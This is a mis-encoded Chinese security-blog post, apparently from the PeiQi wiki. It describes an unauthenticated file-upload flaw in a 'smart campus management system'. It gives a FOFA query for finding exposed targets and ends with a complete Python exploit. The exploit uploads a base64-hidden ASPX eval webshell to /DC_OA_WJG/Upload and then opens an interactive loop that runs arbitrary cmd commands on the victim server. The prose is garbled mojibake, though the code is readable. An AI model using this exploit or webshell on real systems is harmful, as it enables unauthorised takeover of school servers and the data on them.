<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ceVqiqWlXTI4h___Bpkjtg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**æ¨è**å…¬ä¼—å·**å•¦ğŸ‘**

å…¬ä¼—å·

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

**æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿå‰å°æ³¨å†Œé¡µé¢å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç”±äºæ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå®¡æŸ¥å¯¼è‡´å¯ä¸Šä¼ æ¶æ„æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨**

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

**æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ**

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

**FOFA è¯­å¥: body="DC_Login/QYSignUp"**

```
ç™»å½•é¡µé¢å¦‚ä¸‹ï¼Œåªè¦å­˜åœ¨ä¼ä¸šç”¨æˆ·æ³¨å†Œå°±å¯èƒ½å‡ºç°æ¼æ´,
æ³¨æ„ä¸‹éƒ¨åˆ†é¡µé¢æ²¡æœ‰æ³¨å†Œç‚¹å‡»ä½ç½®ï¼Œä½†æ˜¯å­˜åœ¨  /DC_OA_WJG/Upload ä¸Šä¼ æ¥å£
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zUyCZtUXZXrBvp29407nicM20KHzXDpktKOWtyjBichW4Kx2zglEgfoyNcbtM30RXUYn4a2dSXHAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zUyCZtUXZXrBvp29407nic0K0adEOJS6IhGg6NR7v4ibnS1TDOicq6q27rTAFgFhBm3eqtPqtpa2Ng/640?wx_fmt=png)

è¿™ä¸ªåœ°æ–¹çš„ä¸Šä¼ é™„ä»¶å…è®¸äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ŒåŒ…æ‹¬ aspx æœ¨é©¬ï¼Œä¸Šä¼ åè¿˜ä¼šè¿”å› webshell åœ°å€  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zUyCZtUXZXrBvp29407nicmXCxEKpv08Me1apSChibDpJeZkbLVqIyQahljicXqlp0WodR3JicnFpjQ/640?wx_fmt=png)

ä¸Šä¼ çš„æ˜¯å†°èæœ¨é©¬ï¼Œç›´æ¥è¿æ¥

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zUyCZtUXZXrBvp29407nicEP07QiapkoCSYOAQqDc0ibZ35lFibl6hoLyOVROibBxqCMG2EgoF5oR15g/640?wx_fmt=png)

****å››:Â  æ¼æ´ POCğŸ¦‰****

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                                                   \033[0m')
    print('+  \033[34mVersion: æ™ºæ…§æ ¡å›­ç®¡ç†ç³»ç»Ÿ                                            \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/DC_OA_WJG/Upload"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNxqOHxbHqt9mf7s5",
    }
    data = base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5TnhxT0h4YkhxdDltZjdzNQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwRmlsZSI7IGZpbGVuYW1lPSJQZWlRaS5hc3B4IgpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQoKPHNjcmlwdCBsYW5ndWFnZT0iSlNjcmlwdCIgcnVuYXQ9InNlcnZlciI+ZnVuY3Rpb24gUGFnZV9Mb2FkKCl7ZXZhbChSZXF1ZXN0WyJQZWlRaSJdLCJ1bnNhZmUiKTt9PC9zY3JpcHQ+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlOeHFPSHhiSHF0OW1mN3M1LS0=")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/DC_OA_WJG/Upload å°è¯•ä¸Šä¼ æœ¨é©¬..... \033[0m".format(target_url))
        if 'true' in response.text and 'path' in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  Webshellæ–‡ä»¶\033[0m".format(target_url))
            webshell_path = re.findall(r'"path":"(.*?)"', response.text)[0]
            print("\033[32m[o] Webshellæ–‡ä»¶åœ°å€: {}/{} \033[0m".format(target_url, webshell_path))
            while True:
                Cmd = str(input("\033[35mCmd >>> \033[0m"))
                cmd_url = target_url + "/" + webshell_path + "?PeiQi=Response.Write(new%20ActiveXObject(%22WSCRIPT.Shell%22).exec(%22cmd%20/c%20{}%22).StdOut.ReadAll());".format(Cmd)
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                response = requests.get(url=cmd_url, data=data, headers=headers, verify=False, timeout=5)
                print("\033[32m[o] å“åº”ä¸º:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ Webshellæ–‡ä»¶å¤±è´¥\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5zUyCZtUXZXrBvp29407nicICaadTpiazxOHq60WBlVMMrAiaymjfxQGVH3nallfjPZsambp7rR4OUg/640?wx_fmt=png)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“çš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« å’Œé‡å¤§çš„æ¼æ´éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·å’Œäº¤æµç¾¤ä¸­ï¼Œæƒ³è¦åŠ å…¥äº¤æµç¾¤çš„å¸ˆå‚…åŠ æˆ‘å¥½å‹æ‹‰ä½ å•¦~
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­
> 
> https://github.com/PeiQi0/PeiQi-WIKI-POC

å…¬ä¼—å·